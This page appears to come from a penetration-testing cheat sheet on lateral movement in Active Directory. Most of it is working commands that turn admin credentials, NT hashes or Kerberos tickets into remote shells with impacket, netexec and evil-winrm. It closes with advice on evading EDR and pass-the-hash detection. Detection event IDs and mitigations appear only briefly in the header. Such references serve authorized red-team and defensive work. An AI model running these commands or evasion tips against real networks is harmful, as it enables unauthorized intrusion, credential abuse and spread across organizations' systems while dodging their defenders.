---
title: Remote execution
category: AD / Lateral Movement
order: 10
tags: [psexec, wmiexec, smbexec, winrm, pass-the-hash, lateral]
summary: >
  Turn admin rights on a host into a shell. Pick the method by OPSEC: psexec is
  loud (service + share), wmiexec/atexec are quieter, WinRM is clean where it's
  enabled. All accept a password, an NT hash (PtH), or a Kerberos ticket.
prerequisites:
  - Local admin on the target ($ip) via password, NT hash, or ticket
  - The relevant port open (445 for SMB exec, 5985 for WinRM)
tools: [impacket (psexec/smbexec/wmiexec/atexec/dcomexec), netexec, evil-winrm]
detection:
  - 7045 service install (psexec); 4688 wmiprvse/at child processes; 4624 type 3
  - ADMIN$ writes; named-pipe activity
mitigation:
  - LAPS (unique local admin pw); tiering; block lateral SMB/WinRM; EDR
refs:
  - { label: "Impacket", url: "https://github.com/fortra/impacket" }
  - { label: "HackTricks — lateral movement", url: "https://book.hacktricks.xyz/windows-hardening/lateral-movement" }
---

## impacket exec methods

```sh
psexec.py  $domain/$user:$password@$ip        # SYSTEM; noisy (service + share)
smbexec.py $domain/$user:$password@$ip        # semi-interactive, no binary on disk
wmiexec.py $domain/$user:$password@$ip        # WMI; stealthier, per-command
atexec.py  $domain/$user:$password@$ip 'whoami'   # scheduled task
dcomexec.py -object MMC20 $domain/$user:$password@$ip
```

## Pass-the-Hash

```sh
psexec.py -hashes :$nthash administrator@$ip
wmiexec.py -hashes :$nthash $domain/$user@$ip
```

## netexec (spray + exec across a range)

```sh
netexec smb $ip -u $user -p $password -x 'whoami'            # cmd
netexec smb $ip -u $user -H $nthash -X '$env:USERNAME'       # powershell
```

## WinRM

```sh
evil-winrm -i $ip -u $user -p $password
evil-winrm -i $ip -u $user -H $nthash
netexec winrm $ip -u $user -p $password -x 'hostname'
```

## With a Kerberos ticket

```sh
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass $target
netexec smb $target -k --use-kcache -x 'whoami'
```

> Prefer **wmiexec/atexec** over psexec when EDR is present, and Kerberos
> (`-k`) over NTLM to dodge PtH detections and NTLM-relay hardening.
